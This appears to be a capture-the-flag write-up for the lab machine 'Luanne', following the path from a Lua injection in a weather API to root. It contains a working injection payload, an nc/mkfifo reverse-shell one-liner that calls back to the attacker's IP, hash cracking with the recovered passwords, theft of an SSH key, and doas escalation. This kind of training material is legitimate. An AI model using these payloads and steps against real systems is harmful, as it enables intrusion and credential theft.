# Luanne

export IP=10.10.10.218

# Solution 

Lets start with a nmap scan

```
cmd: nmap -sC -sV -oN nmap/initial $IP

22/tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey: 
|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp   open  http    nginx 1.19.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=.
| http-robots.txt: 1 disallowed entry 
|_/weather
|_http-title: 401 Unauthorized
9001/tcp open  http    Medusa httpd 1.12 (Supervisor process manager)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=default
|_http-title: Error response
```

Lets do an all port on the side... <br>

Visiting both ports it shows a login dialog... <br>

Lets fuzz it  ... nothing more than index and robots (nmap already disclosed that) <br>

Checking /robots.txt
```
User-agent: *
Disallow: /weather  #returning 404 but still harvesting cities 
```

Lets try to fuzz the cities, might have something interesting
```
cmd: wfuzz -c -w /opt/SecLists/Miscellaneous/us-cities.txt --sc 200,300,301,302 http://$IP/weather?city=FUZZ

Nothing found
```

Well nothing there... lets try enumerate the weather page
```
cmd: wfuzz -c -w /opt/SecLists/Miscellaneous/us-cities.txt --sc 200,300,301,302 http://$IP/weather/FUZZ

Nothing found
```

Hum.... lets try a common list
```
cmd: wfuzz -c -w /opt/SecLists/Discovery/Web-Content/big.txt --sc 200,300,301,302 http://$IP/weather/FUZZ

000007819:   200        1 L      12 W       90 Ch       "forecast" 
```

Visiting /weather/forecast we got
```
"No city specified. Use 'city=list' to list available cities."
```

Visiting /weather/forecast?city=list we got
```
0	"London"
1	"Manchester"
2	"Birmingham"
3	"Leeds"
4	"Glasgow"
5	"Southampton"
6	"Liverpool"
7	"Newcastle"
8	"Nottingham"
9	"Sheffield"
10	"Bristol"
11	"Belfast"
12	"Leicester"
```

After verifying all the cities nothing really seemed "off" ... <br>

Tried several LFI commands and nothing
```
/weather/forecast?city=../../../../../../../etc/passwd
/weather/forecast?city=London;../../../../../../../etc/passwd
```

After alot of time, and without finding any information online for this (nor for the Medusa service) i asked for a nudge... <br>

Nudge: try '
```
REQUEST: /weather/forecast?city='
RESPONSE: <br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
```

We can already see that is running lua <br>

Checking google for system commands execution (for lua)
```
os.execute (command)
```

Lets try to find a command to print something from the FS 
```
REQUEST: /weather/forecast?city='os.execute("whoami")
RESPONSE: <br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
---------------------------------------------
REQUEST: /weather/forecast?city='os.execute("whoami")-- (the trailing -- in lua comment the rest of the line)
RESPONSE: <br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
---------------------------------------------
REQUEST: /weather/forecast?city=']os.execute("whoami")-- 
RESPONSE: <br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value

```

Since i was not finding the exploit to RCE i tried (for the 9999999th time search for things)...
```
Search: weather.lua webapi
Result: https://gist.github.com/meskarune/5729e8d6c8428e9c70a72bed475db4e1

weather = http.request(("%sid=%s&units=%s&APPID=%s"):format(api_url, cityid, cf, apikey)) <---- thisss!!!
```

This might be the line triggering this error (not actually like this, but something similar) <br>

The line is actually just building requesting to the some web api that retrieves the data..

if it maintains this structure, it is exploitable like following
```
COMMAND: http.request(("%sid=%s&units=%s&APPID=%s"):format(api_url, cityid, cf, apikey))
--------------------------------------------------------------------------------------------
REQUEST: /weather/forecast?city='))os.execute("whoami")-- 
Code after:  http.request(("%sid='))os.execute("whoami") --
--------------------------------------------------------------------------------------------
RESPONSE: <br>Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
```

This was assuming that it was running that format string but it can be using concatenation
```
Hypothetic command: http.request("%s" .. api_url .. "id=" .. cityid .. "&units=" .. cf .. "&APPID=" .. apikey))
--------------------------------------------------------------------------------------------
REQUEST 1: /weather/forecast?city=")os.execute("whoami")-- 
Code after 1: http.request("%s" .. api_url .. "id=" .. ")os.execute("whoami") -- 

RESPONSE: "error": "unknown city: ")os.execute("cat /etc/passwd")--"}   <---- transforming in string
--------------------------------------------------------------------------------------------
REQUEST 2: /weather/forecast?city=')os.execute("whoami")--
Code after 2: http.request("%s" .. api_url .. "id=" .. ')os.execute("whoami") -- 

RESPONSE: error": "unknown city: _httpd  <- The user... We got RCE
```

Although RCE was achieved, the command might not have double quotes but single... well we got RCE, lets continue... <br>

Tried several ways to get reverse shell, but none was workin so i tried: <b> uname -a </b>

```
NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
```

Lets try an openBSD reverse shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.243 1414 >/tmp/f
```

Got connection, but with error... no bash
```
Connection from 10.10.10.218:55314
sh: /bin/bash: not found


NEW PAYLOAD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.243 1414 >/tmp/f
REQUEST: /weather/forecast?city=')os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.243 1414 >/tmp/f")--
```

And voila, we got a reverse shell
```
$ whoami && id

_httpd
uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
```

The system is extremely restricted and is missing alot of usefull programs (python, bash, touch, etc...) <br>

Lets manually enumerate
```
cmd: find / -type f -perm -4000 -print 2>/dev/null
Results: nothing interesting

cmd: shh-keygen 
Result: impossible to write, home is /var/www/

```

Checking the system around
```
cmd: cd ~
----------------------------------------------------------
cmd: ls -la
Results:
total 20
drwxr-xr-x   2 root  wheel  512 Nov 25 11:27 .
drwxr-xr-x  24 root  wheel  512 Nov 24 09:55 ..
-rw-r--r--   1 root  wheel   47 Sep 16 15:07 .htpasswd
-rw-r--r--   1 root  wheel  386 Sep 17 20:56 index.html
-rw-r--r--   1 root  wheel   78 Nov 25 11:38 robots.txt
----------------------------------------------------------
cmd: cat .htpasswd
Results: webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```

Checking online for the type (src: )
```
md5crypt, MD5 (Unix)

cmd: hashcat -h | grep md5
Results:  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating System
cmd (to crack): hashcat -a 0 -m 500 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt
```

Results
```
webapi_user:iamthebest
```

This creds work on the port 80, but i found nothing with the some fuzzing... <br>

Need to manual enumerate the machine
```
cmd: ps aux | grep r.michaels

r.michaels   185  0.0  0.0  34996  2024 ?     Is    7:17AM 0:00.01 /usr/libexec

--------------------------------------------------------------------------------
cmd: cat /etc/ssh/sshd_config

PermitRootLogin yes 
PasswordAuthentication no (need root ssh key for that attack vector)
--------------------------------------------------------------------------------
cmd: netstat -an | grep LISTEN

tcp        0      0  127.0.0.1.3000         *.*                    LISTEN <------------- APPEARS WHEN CANCELLING LOGIN ON PORT 80
tcp        0      0  127.0.0.1.3001         *.*                    LISTEN <------------- NEW 
tcp        0      0  *.80                   *.*                    LISTEN
tcp        0      0  *.22                   *.*                    LISTEN
tcp        0      0  *.9001                 *.*                    LISTEN
tcp6       0      0  *.22                   *.*                    LISTEN

```

Curling <b> PORT 3001 </b> we got: <b> 401 Unauthorized</b>   <br>

Lets try with the creds found.... might work
```
REQUEST: curl -vv -u webapi_user:iamthebest "http://127.0.0.1:3001/"

RESPONSE:

<!doctype html>
<html>
  <head>
    <title>Index</title>
  </head>
  <body>
    <p><h3>Weather Forecast API</h3></p>
    <p><h4>List available cities:</h4></p>
    <a href="/weather/forecast?city=list">/weather/forecast?city=list</a>
    <p><h4>Five day forecast (London)</h4></p>
    <a href="/weather/forecast?city=London">/weather/forecast?city=London</a>
    <hr>
  </body>
</html>
```

Seems equal to the information in the port 80.... <br>

Lets enumerate a little more... <br>
```
cmd: ps auwx 

USER        PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
(...)
root        299  0.0  0.0  35568  1836 ?     Is    5:45PM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
_httpd      336  0.0  0.2 118216 13524 ?     Ss    5:45PM 0:00.75 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 <------- (I ALMOST FORGOT) 
r.michaels  390  0.0  0.0  38604  2016 ?     Is    5:45PM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home
_httpd      394  0.0  0.0  34952  1976 ?     Is    5:45PM 0:00.01 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/
```

There is python, i can finally stabilize the shell... oh god what a pain <br>

Also i can run linpeas in tmp, im so dumb...
```
[+] Hashes inside passwd file? ........... Binary file /etc/pwd.db matches

/var/supervisord/log/memory_stdout.log
/var/supervisord/log/processes_stdout.log
/var/supervisord/log/uptime_stdout.log

/etc/supervisord.conf:password = 123
/etc/supervisord.conf:username = user

```

The creds found work (user:123) for the service on <b> PORT 9001 </b> !  (supervisor) <br> 
The information present there does not add anything to what i already found by enumerating the machine...

One thing i noted is that the commands were not fully displayed so i tried to view all the commands' length

```
/usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www
```
I searched all the web for some flags on this command and nothing... so i went ahead and tried to run the program to check the help page
```
-u                   enable ~user/public_html support
-X                   directory index support
-U username          change user to `user'
```

Basically using the <b> -u </b>  flag enables to reference to the user used in the -U flag and access the files contained in the last argument (the <b> -b </b> flag does not have anything to do with the path)... <br>

This means that, if we curl to /~r.michaels/ we are accessing /home/r.michaels/devel/www folder !! <br>

```
REQUEST: curl -u webapi_user:iamthebest "http://127.0.0.1:3001/~r.michaels/"

RESPONSE (trimmed): 
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
```

Seems there is a symlink (or an backup/copy) of the user <b> r.michaels</b> in this folder...
```
REQUEST: curl -u webapi_user:iamthebest "http://127.0.0.1:3001/~r.michaels/id_rsa"

RESPONSE: (in this notes' folder)
```

Ssh into the machine... Got user
```
cmd: whoami && id

r.michaels
uid=1000(r.michaels) gid=100(users) groups=100(users)

cmd: cat ~/user.txt
FLAG: ea5f0ce6a917b0be1eabc7f9218febc0
```

Now onto root ! <br>

Passed linpeas to a writable folder in the user home dir... <br>

Also seen some files (pub pgp keys) in the .gnupg folder and an encrypted backup in <b>~/backups/</b> </br>

```
99% privesc in PATH (can write to /home/r.michaels/bin)

/etc/pam.d/sshd

[+] Hashes inside passwd file? ........... Binary file /etc/pwd.db matches

-r--r--r--  1 root  wheel  1498 Feb 14  2020 /etc/skel/.profile

```

Just need to find something that runs as root is vulnerable to PATH injection... <br>

Since i did not found anything (and we have the gnupg keys), lets try to find some program pgp related

```
cmd: find / -type f -iname "*pgp*" -print 2>/dev/null

/usr/bin/netpgp
/usr/bin/netpgpkeys
/usr/bin/netpgpverify

(the rest were libraries)
```

With the first we have an help screen which indicates that we can decrypt using the following command
```
cmd: netpgp --decrypt backups/devel_backup-2020-09-16.tar.gz.enc --output .gnupg/ext 


signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14 
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a 
uid              RSA 2048-bit key <r.michaels@localhost>
```

It work and used the RSA key to decrypt the file... interesting... lets checl <br> 

After extraction there was another .htpasswd file
```
webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu. (same encryption mode as before - md5)
```

Cracking it
```
cmd: hashcat -a 0 -m 500 hash2.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt

Results: 

webapi_user:littlebear 
```

Tried to su to root but got a problem here
```
cmd: su root

su: You are not listed in the correct secondary group (wheel) to su root.
su: Sorry: Authentication erro
```

Also it does not have the sudo command... <br> After further search found that sudo is replaced in the *BSD distros with <b> doas </b> which basically let someone run a command as another user

```
cmd: doas -u root /bin/ksh
Password: littlebear

cmd: whoami && id

root
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)

cat ~/root.txt
FLAG: 7a9b5c206e8e8ba09bb99bd113675f66
```

